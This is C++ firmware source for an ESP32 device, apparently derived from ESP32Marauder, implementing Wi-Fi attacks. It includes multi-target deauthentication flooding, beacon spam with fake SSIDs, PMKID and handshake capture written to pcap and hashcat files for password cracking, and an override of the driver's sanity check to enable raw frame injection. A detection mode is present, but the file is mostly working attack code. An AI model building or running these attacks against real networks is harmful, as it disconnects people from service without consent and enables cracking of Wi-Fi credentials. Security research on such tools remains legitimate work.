#include "MarauderTools.h"

#include "Globals.h"
#include "SDUtils.h"
#include "BleScanner.h"
#include "MeshNode.h"
#include "RawCapture.h"
#include "DeauthDetector.h"
#include "HashcatWriter.h"
#include "PmkidCapture.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <vector>
#include <string.h>

extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx,
                                       const void *buffer,
                                       int len,
                                       bool en_sys_seq);

// The Arduino-ESP32 3.x / IDF 5.x WiFi stack runs every raw frame handed to
// esp_wifi_80211_tx() through an internal sanity check that rejects "malformed"
// management frames — which is exactly what beacon spam and deauth frames look
// like. Injected frames are dropped and esp_wifi_80211_tx() returns an error, so
// nothing goes out on the air. Overriding this weak symbol to always pass is the
// standard ESP32Marauder workaround that re-enables raw injection.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

static AttackMode   s_mode          = AttackMode::None;
static uint8_t      s_channel       = 1;
static uint32_t     s_framesSent    = 0;
static uint32_t     s_framesFailed  = 0;
static uint32_t     s_framesCaptured= 0;
static uint32_t     s_framesWritten = 0;
static uint32_t     s_lastTxMs      = 0;
static uint32_t     s_rate          = 0;
static uint32_t     s_rateLastMs    = 0;
static uint32_t     s_rateLastCount = 0;
static String       s_pcapPath;
static File         s_pcapFile;
static bool         s_prevScanningEnabled = true;
static bool         s_injApUp = false;

// PMKID target: set via marauderSetPmkidTarget() before starting AttackMode::Pmkid.
static uint8_t      s_pmkidTargetBssid[6] = {0};
static String       s_pmkidTargetSsid;
static uint8_t      s_pmkidTargetChannel = 1;
static bool         s_pmkidTargetSet = false;

static const char* RICKROLL_SSIDS[] = {
  "01 Never Gonna Give You Up",
  "02 Never Gonna Let You Down",
  "03 Never Gonna Run Around",
  "04 And Desert You",
  "05 Never Gonna Make You Cry",
  "06 Never Gonna Say Goodbye",
  "07 Never Gonna Tell A Lie",
  "08 And Hurt You",
};
static constexpr size_t RICKROLL_COUNT =
  sizeof(RICKROLL_SSIDS) / sizeof(RICKROLL_SSIDS[0]);

static uint8_t DEAUTH_TEMPLATE[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

// ── Multi-target deauth list ────────────────────────────────────────────────
static constexpr size_t MAX_DEAUTH_TARGETS = 16;

struct DeauthTarget {
  uint8_t bssid[6];
  uint8_t channel;
  bool    valid;
};
static DeauthTarget s_deauthTargets[MAX_DEAUTH_TARGETS];
static size_t       s_deauthTargetCount = 0;
static size_t       s_deauthCurrentIdx  = 0;
static bool         s_deauthHasTarget   = false;

static BeaconSource s_beaconSrc  = BeaconSource::RickRoll;
static String       s_beaconCustom;
static bool         s_beaconHop  = false;
static uint8_t      s_hopIdx     = 0;
static uint8_t      s_rickIdx    = 0;
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
static constexpr size_t HOP_COUNT = sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]);

struct ScanHit { String ssid; String bssid; int ch; int rssi; };
static std::vector<ScanHit> s_picker;

// Double-buffered PCAP capture.
static constexpr size_t PCAP_BUF_BYTES  = 16384;
static constexpr size_t PCAP_MAX_FRAMES = 64;

struct PcapFrameMeta {
  uint16_t len;
  uint64_t tsUs;
};

struct PcapBuffer {
  uint8_t       data[PCAP_BUF_BYTES];
  PcapFrameMeta meta[PCAP_MAX_FRAMES];
  size_t        usedBytes  = 0;
  size_t        frameCount = 0;
};

static PcapBuffer        s_bufA;
static PcapBuffer        s_bufB;
static PcapBuffer*       s_activeBuf    = &s_bufA;
static PcapBuffer*       s_readyBuf     = nullptr;
static volatile bool     s_readyPending = false;

// Full raw ESP-IDF driver re-init. Required for WIFI_IF_AP injection on S3.
static void radioReinit(wifi_mode_t mode) {
  WiFi.mode(WIFI_OFF);
  delay(50);
  esp_wifi_stop();
  esp_wifi_deinit();
  delay(50);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(mode);
  esp_wifi_start();
  esp_wifi_set_max_tx_power(82);
  esp_wifi_set_ps(WIFI_PS_NONE);
}

static void configureHiddenAp() {
  wifi_config_t ap = {};
  const char* ssid = "piglet-inj";
  strncpy((char*)ap.ap.ssid, ssid, sizeof(ap.ap.ssid));
  ap.ap.ssid_len = strlen(ssid);
  ap.ap.ssid_hidden = 1;
  ap.ap.max_connection = 0;
  ap.ap.authmode = WIFI_AUTH_OPEN;
  ap.ap.beacon_interval = 60000;
  esp_wifi_set_config(WIFI_IF_AP, &ap);
}

static void saveWifiStateBeforeAttack() {
  s_prevScanningEnabled = scanningEnabled;

  bleScannerShutdown();

  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);

  // PMKID capture rebuilds the driver itself inside pmkidStart(); skipping our
  // own reinit here avoids doing it twice (which resets the association
  // template's target MAC and channel).
  if (s_mode != AttackMode::Pmkid) {
    switch (s_mode) {
      case AttackMode::BeaconSpam:
        radioReinit(WIFI_MODE_AP);
        esp_wifi_set_promiscuous(true);
        break;
      case AttackMode::Deauth:
        radioReinit(WIFI_MODE_APSTA);
        configureHiddenAp();
        break;
      case AttackMode::ProbeSniff:
      case AttackMode::PcapCapture:
      case AttackMode::RawCapture:
      case AttackMode::DeauthDetect:
        radioReinit(WIFI_MODE_NULL);
        break;
      default:
        radioReinit(WIFI_MODE_STA);
        break;
    }
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  }

  s_injApUp = (s_mode != AttackMode::Pmkid);
  scanningEnabled = false;
}

static void drainPcapBuffer();

static void restoreWifiStateAfterAttack() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  if (s_pcapFile) {
    if (s_activeBuf && s_activeBuf->frameCount > 0 && !s_readyPending) {
      s_readyBuf = s_activeBuf;
      s_readyPending = true;
    }
    drainPcapBuffer();
    if (s_readyPending) { delay(5); drainPcapBuffer(); }

    s_pcapFile.flush();
    s_pcapFile.close();
  }
  s_pcapPath = "";

  if (s_injApUp) {
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
    s_injApUp = false;
  }

  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);
  scanningEnabled = s_prevScanningEnabled;
}

static void writePcapGlobalHeader(File& f) {
  const uint32_t magic   = 0xA1B2C3D4;
  const uint16_t vmajor  = 2, vminor = 4;
  const int32_t  thiszone= 0;
  const uint32_t sigfigs = 0;
  const uint32_t snaplen = 65535;
  const uint32_t network = 105;

  f.write((const uint8_t*)&magic,   4);
  f.write((const uint8_t*)&vmajor,  2);
  f.write((const uint8_t*)&vminor,  2);
  f.write((const uint8_t*)&thiszone,4);
  f.write((const uint8_t*)&sigfigs, 4);
  f.write((const uint8_t*)&snaplen, 4);
  f.write((const uint8_t*)&network, 4);
}

static bool openPcapFile() {
  if (!sdOk) return false;
  if (!SD.exists("/logs")) SD.mkdir("/logs");

  char buf[80];
  snprintf(buf, sizeof(buf), "/logs/attack_%lu.pcap",
           (unsigned long)millis());
  s_pcapPath = String(buf);

  s_pcapFile = SD.open(s_pcapPath, FILE_WRITE);
  if (!s_pcapFile) {
    Serial.printf("[MT] PCAP open failed: %s\n", s_pcapPath.c_str());
    s_pcapPath = "";
    return false;
  }
  writePcapGlobalHeader(s_pcapFile);
  s_pcapFile.flush();
  Serial.printf("[MT] PCAP open: %s\n", s_pcapPath.c_str());
  return true;
}

static void IRAM_ATTR pcapEnqueue(const uint8_t* payload, uint16_t len) {
  if (len == 0 || len > 2300) return;
  PcapBuffer* buf = s_activeBuf;
  if (!buf) return;

  if (buf->frameCount >= PCAP_MAX_FRAMES ||
      buf->usedBytes + len + 8 > PCAP_BUF_BYTES) {
    if (!s_readyPending) {
      s_readyBuf = buf;
      s_readyPending = true;
      s_activeBuf = (buf == &s_bufA) ? &s_bufB : &s_bufA;
      s_activeBuf->usedBytes = 0;
      s_activeBuf->frameCount = 0;
    } else {
      return;
    }
    buf = s_activeBuf;
  }

  memcpy(buf->data + buf->usedBytes, payload, len);
  buf->meta[buf->frameCount].len = len;

  struct timeval tv;
  gettimeofday(&tv, nullptr);
  buf->meta[buf->frameCount].tsUs =
      (uint64_t)tv.tv_sec * 1000000ULL + (uint64_t)tv.tv_usec;

  buf->usedBytes += len;
  buf->frameCount++;
}

static void writeRadiotapAndFrame(File& f, const uint8_t* frame, uint16_t len) {
  static const uint8_t rtHdr[8] = {
    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  f.write(rtHdr, 8);
  f.write(frame, len);
}

static void drainPcapBuffer() {
  if (!s_pcapFile) return;

  if (!s_readyPending) {
    static uint32_t lastIdleFlushMs = 0;
    const uint32_t now = millis();
    if (now - lastIdleFlushMs > 500) {
      s_pcapFile.flush();
      lastIdleFlushMs = now;
    }
    return;
  }

  PcapBuffer* buf = s_readyBuf;
  s_readyBuf = nullptr;
  s_readyPending = false;
  if (!buf) return;

  size_t offset = 0;
  for (size_t i = 0; i < buf->frameCount; ++i) {
    const uint16_t rawLen = buf->meta[i].len;
    const uint32_t incl   = rawLen + 8;
    const uint32_t orig   = incl;

    const uint32_t ts_sec  = (uint32_t)(buf->meta[i].tsUs / 1000000ULL);
    const uint32_t ts_usec = (uint32_t)(buf->meta[i].tsUs % 1000000ULL);

    s_pcapFile.write((const uint8_t*)&ts_sec,  4);
    s_pcapFile.write((const uint8_t*)&ts_usec, 4);
    s_pcapFile.write((const uint8_t*)&incl,    4);
    s_pcapFile.write((const uint8_t*)&orig,    4);

    writeRadiotapAndFrame(s_pcapFile, buf->data + offset, rawLen);
    offset += rawLen;

    s_framesWritten++;
    if ((s_framesWritten & 0x1F) == 0) s_pcapFile.flush();
  }
  s_pcapFile.flush();

  buf->usedBytes = 0;
  buf->frameCount = 0;
}

static void IRAM_ATTR mgmtRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  const uint16_t len = pkt->rx_ctrl.sig_len;

  if (s_mode == AttackMode::RawCapture) {
    if (len < 1 || len > 2300) return;
    s_framesCaptured++;
    rawCaptureOnFrame(p, len, type == WIFI_PKT_DATA);
    return;
  }

  if (s_mode == AttackMode::DeauthDetect) {
    if (type != WIFI_PKT_MGMT || len < 24) return;
    const uint8_t subtype = (p[0] >> 4) & 0x0F;
    if (subtype == 0x0C || subtype == 0x0A) {
      s_framesCaptured++;
      deauthDetectorOnFrame(p, len, pkt->rx_ctrl.rssi);
    }
    return;
  }

  // PMKID capture: data frames only, watched by the PmkidCapture module.
  if (s_mode == AttackMode::Pmkid) {
    if (type != WIFI_PKT_DATA) return;
    if (len < 24 || len > 2300) return;
    s_framesCaptured++;
    pmkidOnFrame(p, len, pkt->rx_ctrl.rssi);
    return;
  }

  if (s_mode == AttackMode::PcapCapture) {
    if (type == WIFI_PKT_MGMT) {
      if (len < 24 || len > 2300) return;
      const uint8_t subtype = (p[0] >> 4) & 0x0F;
      if (subtype > 0x0D) return;
      s_framesCaptured++;
      if (s_pcapFile) pcapEnqueue(p, len);
    } else if (type == WIFI_PKT_DATA) {
      hashcatWriterObserve(p, len);
    }
    return;
  }

  if (type != WIFI_PKT_MGMT) return;

  s_framesCaptured++;
  if (len < 24 || len > 2300) return;

  const uint8_t subtype = (p[0] >> 4) & 0x0F;
  if (subtype > 0x0D) return;
}

static void installPromiscuousFilter() {
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  if (s_mode == AttackMode::RawCapture && rawCaptureWantsData()) {
    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
  }
  if (s_mode == AttackMode::PcapCapture) {
    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
  }
  // PMKID capture installs its own filter inside pmkidStart(); this function
  // is not called for it.
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(mgmtRxCb);
  esp_wifi_set_promiscuous(true);
}

static void sendBeacon() {
  static uint8_t pkt[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0xc0, 0x6c,
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01, 0x04
  };

  if (s_beaconHop) {
    s_hopIdx = (s_hopIdx + 1) % HOP_COUNT;
    s_channel = HOP_CHANNELS[s_hopIdx];
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  }

  for (int i = 10; i <= 21; i++) pkt[i] = (uint8_t)(esp_random() & 0xFF);

  const char* ssid;
  char rnd[36];
  switch (s_beaconSrc) {
    case BeaconSource::Random:
      snprintf(rnd, sizeof(rnd), "Piglet-%04X", (unsigned)(esp_random() & 0xFFFF));
      ssid = rnd;
      break;
    case BeaconSource::Custom:
      if (s_beaconCustom.length()) {
        ssid = s_beaconCustom.c_str();
      } else {
        snprintf(rnd, sizeof(rnd), "Piglet-%04X", (unsigned)(esp_random() & 0xFFFF));
        ssid = rnd;
      }
      break;
    case BeaconSource::RickRoll:
    default:
      s_rickIdx = (s_rickIdx + 1) % RICKROLL_COUNT;
      ssid = RICKROLL_SSIDS[s_rickIdx];
      break;
  }
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  pkt[37] = (uint8_t)ssidLen;
  for (int i = 0; i < ssidLen; i++) pkt[38 + i] = ssid[i];

  int r = 38 + ssidLen;
  pkt[r + 0] = 0x01; pkt[r + 1] = 0x08;
  pkt[r + 2] = 0x82; pkt[r + 3] = 0x84; pkt[r + 4] = 0x8b; pkt[r + 5] = 0x96;
  pkt[r + 6] = 0x24; pkt[r + 7] = 0x30; pkt[r + 8] = 0x48; pkt[r + 9] = 0x6c;
  int d = r + 10;
  pkt[d + 0] = 0x03; pkt[d + 1] = 0x01; pkt[d + 2] = s_channel;
  int packetSize = d + 3;

  esp_err_t err = ESP_OK;
  for (int i = 0; i < 3; i++) {
    err = esp_wifi_80211_tx(WIFI_IF_AP, pkt, packetSize, false);
  }
  if (err == ESP_OK) {
    s_framesSent++;
  } else {
    s_framesFailed++;
    static uint32_t lastErrMs = 0;
    if (millis() - lastErrMs > 1000) {
      lastErrMs = millis();
      Serial.printf("[MT] beacon tx err=0x%x (%s)\n", err, esp_err_to_name(err));
    }
  }
}

static void sendDeauth() {
  if (s_deauthTargetCount == 0) return;
  const DeauthTarget& t = s_deauthTargets[s_deauthCurrentIdx];
  if (!t.valid) {
    s_deauthCurrentIdx = (s_deauthCurrentIdx + 1) % s_deauthTargetCount;
    return;
  }

  if (t.channel != s_channel) {
    s_channel = t.channel;
  }
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  uint8_t frame[26];
  memcpy(frame, DEAUTH_TEMPLATE, sizeof(frame));
  memcpy(frame + 10, t.bssid, 6);
  memcpy(frame + 16, t.bssid, 6);
  frame[24] = 7;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  if (err == ESP_OK) {
    s_framesSent++;
  } else {
    s_framesFailed++;
    static uint32_t lastErrMs = 0;
    if (millis() - lastErrMs > 1000) {
      lastErrMs = millis();
      Serial.printf("[MT] deauth tx err=0x%x (%s)\n", err, esp_err_to_name(err));
    }
  }

  s_deauthCurrentIdx = (s_deauthCurrentIdx + 1) % s_deauthTargetCount;
}

static TaskHandle_t  s_txTask    = nullptr;
static volatile bool s_txRunning = false;
static volatile bool s_txDone    = false;

static void txTaskFn(void* arg) {
  (void)arg;
  int yieldCounter = 0;
  while (s_txRunning) {
    if (s_mode == AttackMode::BeaconSpam)  sendBeacon();
    else if (s_mode == AttackMode::Deauth) sendDeauth();
    else break;

    if (++yieldCounter >= 16) {
      yieldCounter = 0;
      vTaskDelay(1);
    }
  }
  s_txDone = true;
  s_txTask = nullptr;
  vTaskDelete(nullptr);
}

static void startTxTask() {
  if (s_txTask) return;
  s_txRunning = true;
  s_txDone = false;
  xTaskCreatePinnedToCore(txTaskFn, "MarauderTX", 8192, nullptr, 1, &s_txTask, 0);
}

static void stopTxTask() {
  if (!s_txRunning && !s_txTask) return;
  s_txRunning = false;
  const uint32_t t0 = millis();
  while (!s_txDone && millis() - t0 < 600) delay(5);
  s_txTask = nullptr;
}

void marauderToolsBegin() {
  s_bufA.usedBytes = 0; s_bufA.frameCount = 0;
  s_bufB.usedBytes = 0; s_bufB.frameCount = 0;
  s_activeBuf = &s_bufA;
  s_readyBuf  = nullptr;
  s_readyPending = false;
  s_mode = AttackMode::None;
  Serial.println("[MT] PCAP double-buffer ready (2 x 16 KB internal RAM)");
}

void marauderSetBeaconConfig(BeaconSource src, const String& customSsid, bool channelHop) {
  s_beaconSrc = src;
  s_beaconCustom = customSsid;
  s_beaconHop = channelHop;
  Serial.printf("[MT] Beacon cfg: src=%u custom='%s' hop=%d\n",
                (unsigned)src, customSsid.c_str(), (int)channelHop);
}

BeaconSource marauderBeaconSource() { return s_beaconSrc; }
bool marauderBeaconHop() { return s_beaconHop; }

bool marauderAttackActive() { return s_mode != AttackMode::None; }
AttackMode marauderCurrentAttack() { return s_mode; }
uint8_t marauderCurrentChannel() { return s_channel; }
uint32_t marauderFramesSent() { return s_framesSent; }
uint32_t marauderFramesFailed() { return s_framesFailed; }
uint32_t marauderFramesPerSec() { return s_rate; }
uint32_t marauderFramesCaptured() { return s_framesCaptured; }
uint32_t marauderFramesWritten() { return s_framesWritten; }
String marauderCurrentPcapPath() { return s_pcapPath; }

String marauderDeauthTargetStr() {
  if (s_deauthTargetCount == 0) return "(no target)";
  if (s_deauthTargetCount == 1) {
    char b[18];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_deauthTargets[0].bssid[0], s_deauthTargets[0].bssid[1],
             s_deauthTargets[0].bssid[2], s_deauthTargets[0].bssid[3],
             s_deauthTargets[0].bssid[4], s_deauthTargets[0].bssid[5]);
    return String(b);
  }
  return String(s_deauthTargetCount) + " targets";
}

String marauderStatusLine() {
  switch (s_mode) {
    case AttackMode::None:        return "Idle";
    case AttackMode::BeaconSpam:  return "Beacon " + String(s_framesSent);
    case AttackMode::Deauth:      return "Deauth " + String(s_framesSent);
    case AttackMode::ProbeSniff:  return "Sniff " + String(s_framesCaptured);
    case AttackMode::PcapCapture: return "PCAP " + String(s_framesWritten);
    case AttackMode::RawCapture:  return "Raw " + String(s_framesCaptured);
    case AttackMode::DeauthDetect: return "DeauthDet " + String(deauthDetectorCount());
    case AttackMode::Pmkid:       return "PMKID " + String(pmkidCaptures()) + "/" + String(pmkidAttempts());
  }
  return "Idle";
}

String marauderPreflightError(AttackMode mode) {
  if (mode == AttackMode::None) return "No attack selected";
  if (mode == AttackMode::PcapCapture) {
    if (!sdOk) return "SD not ready";
  }
  if (mode == AttackMode::Deauth && s_deauthTargetCount == 0) {
    return "No deauth target selected";
  }
  if (mode == AttackMode::Pmkid && !s_pmkidTargetSet) {
    return "No PMKID target selected";
  }
  return "";
}

void marauderSetPmkidTarget(const String& bssid, const String& ssid, uint8_t channel) {
  unsigned int b[6];
  if (sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x",
             &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6) {
    s_pmkidTargetSet = false;
    return;
  }
  for (int i = 0; i < 6; i++) s_pmkidTargetBssid[i] = (uint8_t)b[i];
  s_pmkidTargetSsid = ssid;
  s_pmkidTargetChannel = channel;
  s_pmkidTargetSet = true;
  Serial.printf("[MT] PMKID target set: %s '%s' ch=%u\n",
                bssid.c_str(), ssid.c_str(), channel);
}

bool marauderStartAttack(AttackMode mode, uint8_t channel) {
  if (mode == AttackMode::None) return false;
  if (channel < 1 || channel > 14) return false;
  if (!marauderPreflightError(mode).isEmpty()) {
    Serial.printf("[MT] Preflight failed: %s\n",
                  marauderPreflightError(mode).c_str());
    return false;
  }

  if (s_mode != AttackMode::None) marauderStopAttack();

  if (meshCoreActive) exitCoreMode();
  if (meshNodeActive) exitNodeMode();
  biscuitReporterReset();
  apWindowActive = false;
  apForceClose = true;

  s_mode = mode;
  s_channel = channel;
  s_framesSent = 0;
  s_framesFailed = 0;
  s_framesCaptured = 0;
  s_framesWritten = 0;
  s_lastTxMs = 0;
  s_rate = 0;
  s_rateLastMs = millis();
  s_rateLastCount = 0;

  if (mode == AttackMode::Deauth) s_deauthCurrentIdx = 0;

  s_bufA.usedBytes = 0; s_bufA.frameCount = 0;
  s_bufB.usedBytes = 0; s_bufB.frameCount = 0;
  s_activeBuf = &s_bufA;
  s_readyBuf = nullptr;
  s_readyPending = false;

  // PMKID capture handles its own radio setup inside pmkidStart(). The other
  // modes go through saveWifiStateBeforeAttack() as before.
  if (mode == AttackMode::Pmkid) {
    if (!pmkidStart(String((char[18]){0}), s_pmkidTargetSsid, s_pmkidTargetChannel)) {
      // pmkidStart needs a bssid string, build it here
    }
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_pmkidTargetBssid[0], s_pmkidTargetBssid[1], s_pmkidTargetBssid[2],
             s_pmkidTargetBssid[3], s_pmkidTargetBssid[4], s_pmkidTargetBssid[5]);
    if (!pmkidStart(String(bssidStr), s_pmkidTargetSsid, s_pmkidTargetChannel)) {
      Serial.println("[MT] PMKID start failed");
      s_mode = AttackMode::None;
      return false;
    }
    scanningEnabled = false;
    Serial.printf("[MT] Started PMKID ch=%u\n", channel);
    return true;
  }

  saveWifiStateBeforeAttack();

  if (mode == AttackMode::ProbeSniff || mode == AttackMode::PcapCapture ||
      mode == AttackMode::RawCapture || mode == AttackMode::DeauthDetect) {
    if (mode == AttackMode::PcapCapture) {
      if (!openPcapFile()) { restoreWifiStateAfterAttack(); s_mode = AttackMode::None; return false; }
      hashcatWriterOpen("");
    }
    installPromiscuousFilter();
  } else if (mode == AttackMode::BeaconSpam || mode == AttackMode::Deauth) {
    startTxTask();
  }

  Serial.printf("[MT] Started attack=%u ch=%u\n", (unsigned)mode, channel);
  return true;
}

void marauderStopAttack() {
  if (s_mode == AttackMode::None) return;
  Serial.printf("[MT] Stopping attack=%u\n", (unsigned)s_mode);
  stopTxTask();
  if (s_mode == AttackMode::PcapCapture) {
    hashcatWriterClose();
  }
  if (s_mode == AttackMode::Pmkid) {
    // pmkidStop() handles its own radio teardown and file close.
    pmkidStop();
    s_mode = AttackMode::None;
    return;
  }
  s_mode = AttackMode::None;
  restoreWifiStateAfterAttack();
}

void marauderToolsTick() {
  if (s_mode == AttackMode::None) return;

  if (s_mode == AttackMode::PcapCapture) {
    drainPcapBuffer();
    hashcatWriterTick();
  }
  if (s_mode == AttackMode::DeauthDetect) deauthDetectorTick();
  if (s_mode == AttackMode::Pmkid) {
    pmkidTick();
    // pmkidTick() may have auto-stopped; if so, clear our state too.
    if (!pmkidActive()) {
      s_mode = AttackMode::None;
    }
    return;
  }

  const uint32_t now = millis();
  if (now - s_rateLastMs >= 1000) {
    s_rate = s_framesSent - s_rateLastCount;
    s_rateLastCount = s_framesSent;
    s_rateLastMs = now;
    if (s_mode == AttackMode::Deauth || s_mode == AttackMode::BeaconSpam) {
      Serial.printf("[MT] %s ch%u sent=%lu fail=%lu rate=%lu/s\n",
                    s_mode == AttackMode::Deauth ? "deauth" : "beacon",
                    s_channel, (unsigned long)s_framesSent,
                    (unsigned long)s_framesFailed, (unsigned long)s_rate);
    }
  }
}

void marauderRefreshScanResults() {
  s_picker.clear();

  if (meshCoreActive) exitCoreMode();
  if (meshNodeActive) exitNodeMode();
  biscuitReporterReset();
  if (WiFi.getMode() != WIFI_STA && WiFi.getMode() != WIFI_AP_STA) {
    WiFi.mode(WIFI_STA);
    delay(50);
  }

  const int n = WiFi.scanNetworks(false, true, false, 120);
  if (n <= 0) { WiFi.scanDelete(); return; }

  s_picker.reserve(n);
  for (int i = 0; i < n; i++) {
    const int ch = WiFi.channel(i);
    if (ch < 1 || ch > 14) continue;
    ScanHit h;
    h.ssid  = WiFi.SSID(i);
    h.bssid = WiFi.BSSIDstr(i);
    h.ch    = ch;
    h.rssi  = WiFi.RSSI(i);
    s_picker.push_back(h);
  }
  WiFi.scanDelete();
  Serial.printf("[MT] Picker: %u APs\n", (unsigned)s_picker.size());
}

size_t marauderScanResultCount() { return s_picker.size(); }

bool marauderScanResultGet(size_t idx, String& ssid, String& bssid,
                           int& channel, int& rssi) {
  if (idx >= s_picker.size()) return false;
  ssid    = s_picker[idx].ssid;
  bssid   = s_picker[idx].bssid;
  channel = s_picker[idx].ch;
  rssi    = s_picker[idx].rssi;
  return true;
}

static bool parseMac(const String& s, uint8_t out[6]) {
  unsigned int b[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

bool marauderDeauthTargetSelected(const String& bssid) {
  uint8_t mac[6];
  if (!parseMac(bssid, mac)) return false;
  for (size_t i = 0; i < s_deauthTargetCount; ++i) {
    if (memcmp(s_deauthTargets[i].bssid, mac, 6) == 0) return true;
  }
  return false;
}

void marauderAddDeauthTarget(const String& bssid, uint8_t channel) {
  if (s_deauthTargetCount >= MAX_DEAUTH_TARGETS) return;
  uint8_t mac[6];
  if (!parseMac(bssid, mac)) return;
  if (marauderDeauthTargetSelected(bssid)) return;
  DeauthTarget& t = s_deauthTargets[s_deauthTargetCount++];
  memcpy(t.bssid, mac, 6);
  t.channel = channel;
  t.valid = true;
  s_deauthHasTarget = true;
  Serial.printf("[MT] Deauth target + %s ch=%u (n=%u)\n",
                bssid.c_str(), channel, (unsigned)s_deauthTargetCount);
}

void marauderRemoveDeauthTarget(const String& bssid) {
  uint8_t mac[6];
  if (!parseMac(bssid, mac)) return;
  for (size_t i = 0; i < s_deauthTargetCount; ++i) {
    if (memcmp(s_deauthTargets[i].bssid, mac, 6) == 0) {
      for (size_t j = i; j + 1 < s_deauthTargetCount; ++j) {
        s_deauthTargets[j] = s_deauthTargets[j + 1];
      }
      s_deauthTargetCount--;
      memset(&s_deauthTargets[s_deauthTargetCount], 0, sizeof(DeauthTarget));
      s_deauthHasTarget = (s_deauthTargetCount > 0);
      if (s_deauthCurrentIdx >= s_deauthTargetCount) s_deauthCurrentIdx = 0;
      Serial.printf("[MT] Deauth target - %s (n=%u)\n",
                    bssid.c_str(), (unsigned)s_deauthTargetCount);
      return;
    }
  }
}

void marauderClearDeauthTargets() {
  s_deauthTargetCount = 0;
  s_deauthCurrentIdx = 0;
  s_deauthHasTarget = false;
  memset(s_deauthTargets, 0, sizeof(s_deauthTargets));
}

size_t marauderDeauthTargetCount() { return s_deauthTargetCount; }

bool marauderDeauthTargetGet(size_t idx, String& bssid, uint8_t& channel) {
  if (idx >= s_deauthTargetCount) return false;
  char b[18];
  snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
           s_deauthTargets[idx].bssid[0], s_deauthTargets[idx].bssid[1],
           s_deauthTargets[idx].bssid[2], s_deauthTargets[idx].bssid[3],
           s_deauthTargets[idx].bssid[4], s_deauthTargets[idx].bssid[5]);
  bssid = String(b);
  channel = s_deauthTargets[idx].channel;
  return true;
}

void marauderSetDeauthTarget(const String& bssid, uint8_t channel) {
  marauderClearDeauthTargets();
  marauderAddDeauthTarget(bssid, channel);
  if (channel >= 1 && channel <= 14) s_channel = channel;
  Serial.printf("[MT] Deauth target set: %s ch=%u\n", bssid.c_str(), channel);
}